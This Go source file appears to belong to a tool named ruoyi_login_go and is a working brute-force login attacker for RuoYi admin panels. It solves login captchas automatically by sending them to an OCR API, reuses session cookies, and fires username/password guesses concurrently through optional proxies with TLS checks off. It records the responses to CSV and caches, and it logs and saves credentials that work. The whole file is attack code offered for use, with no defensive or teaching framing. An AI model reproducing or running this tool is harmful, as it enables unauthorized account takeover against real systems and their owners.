package worker

import (
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"
	"sync"
	"time"

	"ruoyi_login_go/cache"
	"ruoyi_login_go/config"
	"ruoyi_login_go/csvwriter"
	"ruoyi_login_go/logging"
	"ruoyi_login_go/ocr"

	"github.com/schollz/progressbar/v3"
)

const (
	// 连续错误最大次数
	maxConsecutiveErrors = 5
	// 连续错误后暂停时间
	errorPauseDuration = 10 * time.Second
	// 验证码获取超时时间
	captchaTimeout = 30 * time.Second
	// 登录请求超时时间
	loginTimeout = 30 * time.Second
	// 验证码队列等待超时
	captchaQueueTimeout = 30 * time.Second
	// 默认 User-Agent
	defaultUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)

// 登录结果类型
type LoginResult int

const (
	ResultUnknown LoginResult = iota
	ResultSuccess
	ResultFailure
	ResultCaptchaError
)

// CaptchaItem 验证码项
type CaptchaItem struct {
	Client *http.Client
	Code   string
}

// LoginWorkerContext 登录工作器上下文
type LoginWorkerContext struct {
	Cfg          *config.Config
	CaptchaQueue chan *CaptchaItem
	Username     string
	Password     string
	Tracker      *progressbar.ProgressBar
	FailedCache  *cache.FailedCache
	SuccessCache *cache.SuccessCache
	StopChan     chan struct{}
	StopFunc     func()
	CSVWriter    *csvwriter.CSVWriter
}

// 全局 OCR 客户端单例（使用 sync.Once 保证线程安全和内存可见性）
var (
	globalOcrClient     *http.Client
	globalOcrClientOnce sync.Once
	globalOcrClientErr  error
)

// 全局共享 Transport（用于验证码会话客户端，复用连接池和 TLS 会话）
var (
	sharedSessionTransport     *http.Transport
	sharedSessionTransportOnce sync.Once
)

// createTransport 创建 http.Transport（参数化差异部分，消除重复代码）
func createTransport(maxConns int, idleTimeout time.Duration, verifySSL bool, proxyURL string) *http.Transport {
	transport := &http.Transport{
		MaxIdleConns:        maxConns,
		MaxIdleConnsPerHost: maxConns,
		IdleConnTimeout:     idleTimeout,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: !verifySSL,
			NextProtos:         []string{"http/1.1"},
		},
	}

	if proxyURL != "" {
		parsedURL, err := url.Parse(proxyURL)
		if err != nil {
			logging.Warnf("解析代理 URL 失败: %v", err)
		} else {
			transport.Proxy = http.ProxyURL(parsedURL)
		}
	}

	return transport
}

// initSharedSessionTransport 初始化全局共享的验证码会话 Transport
func initSharedSessionTransport(cfg *config.Config) {
	sharedSessionTransportOnce.Do(func() {
		sharedSessionTransport = createTransport(cfg.MaxConnections, 90*time.Second, cfg.VerifySSL, cfg.ProxyURL)
	})
}

// GetGlobalOcrClient 获取全局 OCR 客户端单例
func GetGlobalOcrClient(cfg *config.Config) (*http.Client, error) {
	globalOcrClientOnce.Do(func() {
		if cfg == nil {
			globalOcrClientErr = fmt.Errorf("配置不能为空")
			return
		}
		ocrTransport := createTransport(cfg.MaxKeepalive, 30*time.Second, cfg.VerifySSL, cfg.OcrProxyURL)
		globalOcrClient = &http.Client{
			Transport: ocrTransport,
			Timeout:   60 * time.Second,
		}
	})
	return globalOcrClient, globalOcrClientErr
}

// CloseGlobalOcrClient 关闭全局 OCR 客户端和共享 Transport
func CloseGlobalOcrClient() {
	if globalOcrClient != nil {
		globalOcrClient.CloseIdleConnections()
	}
	if sharedSessionTransport != nil {
		sharedSessionTransport.CloseIdleConnections()
	}
}

// createSessionClient 创建验证码会话客户端（共享 Transport 复用连接池，独立 CookieJar 保持会话隔离）
func createSessionClient(cfg *config.Config) (*http.Client, error) {
	initSharedSessionTransport(cfg)

	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, fmt.Errorf("创建 CookieJar 失败: %w", err)
	}

	return &http.Client{
		Transport: sharedSessionTransport,
		Timeout:   captchaTimeout,
		Jar:       jar,
	}, nil
}

// fetchCaptchaImage 获取验证码图片
func fetchCaptchaImage(ctx context.Context, client *http.Client, captchaURL string, headers map[string]string) (string, error) {
	return ocr.GetCaptchaImageWithContext(ctx, client, captchaURL, headers)
}

// solveCaptcha 调用 OCR API 识别验证码
func solveCaptcha(ctx context.Context, ocrClient *http.Client, ocrAPI, imageBase64 string, debugEnabled bool) (string, error) {
	return ocr.SolveCaptchaWithContext(ctx, ocrClient, ocrAPI, imageBase64, debugEnabled)
}

// CaptchaFillerWorker 验证码填充工作器
func CaptchaFillerWorker(cfg *config.Config, captchaQueue chan *CaptchaItem, stopChan chan struct{}, wg *sync.WaitGroup, notifyChan chan struct{}) {
	defer wg.Done()

	ocrClient, err := GetGlobalOcrClient(cfg)
	if err != nil {
		logging.Errorf("获取 OCR 客户端失败: %v", err)
		return
	}

	headers := map[string]string{
		"User-Agent": defaultUserAgent,
	}

	consecutiveErrors := 0
	var sessionClient *http.Client

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// 监听 stopChan，当 stopChan 关闭时取消 ctx，确保所有依赖 ctx 的阻塞操作能退出
	go func() {
		select {
		case <-stopChan:
			cancel()
		case <-ctx.Done():
		}
	}()

	for {
		select {
		case <-stopChan:
			return
		case <-ctx.Done():
			return
		default:
		}

		// 复用 SessionClient，仅在首次或获取失败后创建新的
		if sessionClient == nil {
			sessionClient, err = createSessionClient(cfg)
			if err != nil {
				logging.Errorf("创建会话客户端失败: %v", err)
				continue
			}
		}

		imageBase64, err := fetchCaptchaImage(ctx, sessionClient, cfg.CaptchaURL, headers)
		if err != nil {
			consecutiveErrors = handleCaptchaError(ctx, consecutiveErrors, "获取验证码")
			sessionClient = nil
			continue
		}

		code, err := solveCaptcha(ctx, ocrClient, cfg.OcrAPI, imageBase64, cfg.DebugCaptchaEnabled)
		if err != nil || code == "" {
			consecutiveErrors = handleCaptchaError(ctx, consecutiveErrors, "OCR API")
			continue
		}

		consecutiveErrors = 0

		if !enqueueCaptcha(ctx, captchaQueue, sessionClient, code, notifyChan) {
			return
		}
		// 成功入队后客户端所有权转移，下次迭代创建新的
		sessionClient = nil
	}
}

// handleCaptchaError 处理验证码获取或识别错误（暂停期间响应 context 取消）
func handleCaptchaError(ctx context.Context, consecutiveErrors int, errorSource string) int {
	if ctx.Err() != nil {
		return consecutiveErrors
	}

	consecutiveErrors++
	if consecutiveErrors >= maxConsecutiveErrors {
		logging.Warnf("%s 连续失败 %d 次，暂停 %v", errorSource, consecutiveErrors, errorPauseDuration)
		select {
		case <-time.After(errorPauseDuration):
		case <-ctx.Done():
		}
		consecutiveErrors = 0
	}

	return consecutiveErrors
}

// enqueueCaptcha 将验证码入队，返回是否成功
func enqueueCaptcha(ctx context.Context, captchaQueue chan *CaptchaItem, sessionClient *http.Client, code string, notifyChan chan struct{}) bool {
	item := &CaptchaItem{
		Client: sessionClient,
		Code:   code,
	}

	select {
	case captchaQueue <- item:
		logging.Debugf("captcha pool: %d/%d (enqueued)", len(captchaQueue), cap(captchaQueue))
		select {
		case notifyChan <- struct{}{}:
		default:
		}
		return true
	case <-ctx.Done():
		return false
	}
}

// LoginWorker 登录工作器（验证码错误时内部重试，避免写入已关闭的 taskChan）
func LoginWorker(workerCtx *LoginWorkerContext) {
	select {
	case <-workerCtx.StopChan:
		return
	default:
	}

	// 使用带超时的 context，同时监听 stopChan 以便及时退出
	ctx, cancel := context.WithTimeout(context.Background(), captchaQueueTimeout)
	defer cancel()

	// 监听 stopChan，关闭时取消 context 使 getCaptchaFromQueue 立即返回
	go func() {
		select {
		case <-workerCtx.StopChan:
			cancel()
		case <-ctx.Done():
		}
	}()

	maxRetries := 3
	for attempt := 0; attempt < maxRetries; attempt++ {
		item, err := getCaptchaFromQueue(ctx, workerCtx.CaptchaQueue)
		if err != nil {
			return
		}

		req, err := buildLoginRequest(workerCtx.Cfg.LoginURL, workerCtx.Username, workerCtx.Password, item.Code)
		if err != nil {
			logging.Warnf("构建登录请求失败: %v", err)
			workerCtx.Tracker.Add(1)
			return
		}

		respStr, statusCode, err := sendLoginRequest(item.Client, req)
		if err != nil {
			logging.Warnf("发送登录请求失败: %v", err)
			workerCtx.Tracker.Add(1)
			return
		}

		result := checkLoginResult(respStr, workerCtx.Cfg)

		if result == ResultCaptchaError {
			logging.Warnf("验证码识别错误，重试 %d/%d: %s %s", attempt+1, maxRetries, workerCtx.Username, workerCtx.Password)
			continue
		}

		handleLoginResult(result, workerCtx, respStr, statusCode, item)
		return
	}

	logging.Warnf("验证码重试次数耗尽: %s %s", workerCtx.Username, workerCtx.Password)
	workerCtx.Tracker.Add(1)
}

// getCaptchaFromQueue 从队列获取验证码（使用 context 统一管理超时和取消）
func getCaptchaFromQueue(ctx context.Context, captchaQueue chan *CaptchaItem) (*CaptchaItem, error) {
	select {
	case item := <-captchaQueue:
		logging.Debugf("captcha pool: %d/%d (dequeued)", len(captchaQueue), cap(captchaQueue))
		return item, nil
	case <-ctx.Done():
		if errors.Is(ctx.Err(), context.Canceled) {
			return nil, fmt.Errorf("任务已停止")
		}
		return nil, fmt.Errorf("等待验证码超时")
	}
}

// buildLoginRequest 构建登录请求
func buildLoginRequest(loginURL, username, password, captchaCode string) (*http.Request, error) {
	formData := url.Values{}
	formData.Set("username", username)
	formData.Set("password", password)
	formData.Set("validateCode", captchaCode)
	formData.Set("rememberMe", "false")

	req, err := http.NewRequest("POST", loginURL, strings.NewReader(formData.Encode()))
	if err != nil {
		return nil, fmt.Errorf("创建请求失败: %w", err)
	}

	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("User-Agent", defaultUserAgent)

	return req, nil
}

// sendLoginRequest 发送登录请求
func sendLoginRequest(client *http.Client, req *http.Request) (string, int, error) {
	resp, err := client.Do(req)
	if err != nil {
		return "", 0, fmt.Errorf("请求失败: %w", err)
	}
	defer resp.Body.Close()

	respBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		logging.Warnf("读取响应失败: %v", err)
		return "", resp.StatusCode, nil
	}

	return string(respBytes), resp.StatusCode, nil
}

// checkLoginResult 检查登录结果
func checkLoginResult(respStr string, cfg *config.Config) LoginResult {
	// 检查验证码错误
	if containsAny(respStr, cfg.CaptchaKeywords) {
		return ResultCaptchaError
	}

	// 检查登录成功
	if len(cfg.SuccessKeywords) > 0 && containsAny(respStr, cfg.SuccessKeywords) {
		return ResultSuccess
	}

	// 检查登录失败
	if containsAny(respStr, cfg.FailureKeywords) {
		return ResultFailure
	}

	return ResultUnknown
}

// handleLoginResult 处理登录结果
func handleLoginResult(result LoginResult, workerCtx *LoginWorkerContext, respStr string, statusCode int, item *CaptchaItem) {
	// 记录到 CSV（所有结果都记录）
	logToCSV(workerCtx.CSVWriter, workerCtx.Cfg.LoginURL, workerCtx.Username, workerCtx.Password, statusCode, respStr)

	// 更新进度
	workerCtx.Tracker.Add(1)
	workerCtx.Tracker.Clear()

	switch result {
	case ResultCaptchaError:
		logging.Warnf("验证码识别错误: %s %s", workerCtx.Username, workerCtx.Password)

	case ResultSuccess:
		logging.Infof("成功!!! 账号: %s, 密码: %s", workerCtx.Username, workerCtx.Password)
		if workerCtx.SuccessCache != nil {
			go workerCtx.SuccessCache.Save(workerCtx.Cfg.SuccessFile, workerCtx.Username, workerCtx.Password)
		}
		workerCtx.StopFunc()

	case ResultFailure:
		go workerCtx.FailedCache.Save(workerCtx.Cfg.CacheFile, workerCtx.Username, workerCtx.Password)

	case ResultUnknown:
	}
}

// logToCSV 记录到 CSV
func logToCSV(writer *csvwriter.CSVWriter, loginURL, username, password string, statusCode int, respText string) {
	snippet := cleanSnippet(respText, 50)

	record := []string{
		loginURL,
		username,
		password,
		fmt.Sprintf("%d", statusCode),
		fmt.Sprintf("%d", len(respText)),
		snippet,
	}

	if err := writer.Write(record); err != nil {
		logging.Warnf("写入 CSV 失败: %v", err)
	}
}

// cleanSnippet 清理响应文本并截断为指定长度的摘要（单次遍历，避免 strings.Map 和双重 []rune 转换）
func cleanSnippet(text string, maxRunes int) string {
	text = strings.TrimSpace(text)
	var b strings.Builder
	b.Grow(min(len(text), maxRunes*4))
	count := 0
	for _, r := range text {
		switch r {
		case '"', '\n', '\r', '\t':
			continue
		}
		count++
		if count > maxRunes {
			break
		}
		b.WriteRune(r)
	}
	return b.String()
}

// containsAny 检查字符串是否包含任意一个关键字
func containsAny(s string, keywords []string) bool {
	for _, k := range keywords {
		if strings.Contains(s, k) {
			return true
		}
	}
	return false
}
